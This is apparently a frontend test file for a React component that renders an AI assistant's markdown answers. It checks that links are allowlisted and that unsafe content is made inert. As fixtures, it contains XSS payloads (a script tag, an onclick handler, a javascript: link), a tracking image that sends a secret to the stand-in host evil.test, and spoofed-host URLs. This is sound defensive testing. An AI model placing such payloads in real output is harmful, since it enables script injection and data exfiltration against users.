import type { ReactNode } from "react";
import { describe, expect, it, vi } from "vitest";

import { AssistantMarkdown } from "./AssistantMarkdown";

import { fireEvent, render, screen } from "@testing-library/react";

describe(AssistantMarkdown.name, () => {
  it("renders markdown and opens links in a new tab without a handle back to Console", () => {
    setup({ markdown: "Read **the docs** at [Akash](https://akash.network/docs)." });

    expect(screen.getByText("the docs").tagName).toBe("STRONG");
    const link = screen.getByRole("link", { name: "Akash" });
    expect(link).toHaveAttribute("href", "https://akash.network/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("navigates to a deployment in the same tab", () => {
    const { navigateInApp } = setup({ markdown: "Your [web app](/deployments/24151788) is running." });

    const link = screen.getByRole("link", { name: "web app" });
    fireEvent.click(link);

    expect(navigateInApp).toHaveBeenCalledWith("/deployments/24151788");
    expect(link).toHaveAttribute("href", "/deployments/24151788");
    expect(link).not.toHaveAttribute("target");
    expect(link).not.toHaveAttribute("rel");
  });

  it.each(["/deployments", "/templates", "/templates/akash-network-awesome_akash-comfyui", "/alerts", "/billing", "/usage"])(
    "navigates to %s in the same tab",
    href => {
      const { navigateInApp } = setup({ markdown: `[page](${href})` });

      fireEvent.click(screen.getByRole("link", { name: "page" }));

      expect(navigateInApp).toHaveBeenCalledWith(href);
    }
  );

  it.each([
    "https://akash.network",
    "https://akash.network/docs/deployments/akash-cli/overview/",
    "https://console.akash.network/deployments/1",
    "https://discord.gg/akash",
    "https://discord.com/invite/akash",
    "https://github.com/akash-network/awesome-akash",
    "https://github.com/akash-network",
    "https://github.com/Akash-Network/console/issues"
  ])("opens %s in a new tab without a handle back to Console", href => {
    setup({ markdown: `[page](<${href}>)` });

    const link = screen.getByRole("link", { name: "page" });

    expect(link).toHaveAttribute("href", href);
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it.each([
    "https://example.com/setup?step=2",
    "http://akash.network/docs",
    "https://akash.network.example.com/docs",
    "https://exampleakash.network/docs",
    "https://discord.gg.example.com/akash",
    "https://github.com/example/akash-network",
    "https://github.com/akash-network-example/console",
    "https://gist.github.com/akash-network/1",
    "https://akash.network@example.com/docs",
    "//example.com",
    "//example.com/deployments/1",
    "example.com/deployments/1",
    "/deployments/1/../../example",
    "/deployments/1?next=//example.com",
    "/deployments/1x",
    "/deployments/abc",
    "x/templates/a",
    "/templates/a.b",
    "/templates/a/b",
    "/alertsx",
    "/billing/x",
    "/xusage",
    "mailto:support@example.com"
  ])("shows %j as plain text after the link text instead of a link", href => {
    const { container } = setup({ markdown: `See [the guide](<${href}>) first.` });

    expect(screen.queryByRole("link")).not.toBeInTheDocument();
    expect(container).toHaveTextContent(`See the guide (${href}) first.`);
  });

  it("shows a bare URL once when it is not linkable", () => {
    const { container } = setup({ markdown: "Run the script from https://example.com/install.sh today." });

    expect(screen.queryByRole("link")).not.toBeInTheDocument();
    expect(container.querySelector("p")?.textContent).toBe("Run the script from https://example.com/install.sh today.");
  });

  it("renders GitHub flavored tables", () => {
    setup({ markdown: "| Lease | State |\n| --- | --- |\n| 1 | active |" });

    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "active" })).toBeInTheDocument();
  });

  it("never renders raw HTML or images an answer names", () => {
    const { container } = setup({
      markdown: '<script>window.ran = true</script><b onclick="x()">bold</b>\n\n![tracker](https://evil.test/pixel?secret=1) after'
    });

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("after");
  });

  it("shows javascript links as inert plain text", () => {
    const { container } = setup({ markdown: "[click](javascript:alert(1))" });

    expect(container.querySelector("a")).toBeNull();
    expect(container).toHaveTextContent("click (javascript:void(0))");
  });

  function setup(input: { markdown: string }) {
    const navigateInApp = vi.fn();
    const Link = ({ href, children, ...rest }: { href: string; children: ReactNode }) => (
      <a
        href={href}
        {...rest}
        onClick={event => {
          event.preventDefault();
          navigateInApp(href);
        }}
      >
        {children}
      </a>
    );

    const result = render(<AssistantMarkdown dependencies={{ Link }}>{input.markdown}</AssistantMarkdown>);

    return { ...result, navigateInApp };
  }
});
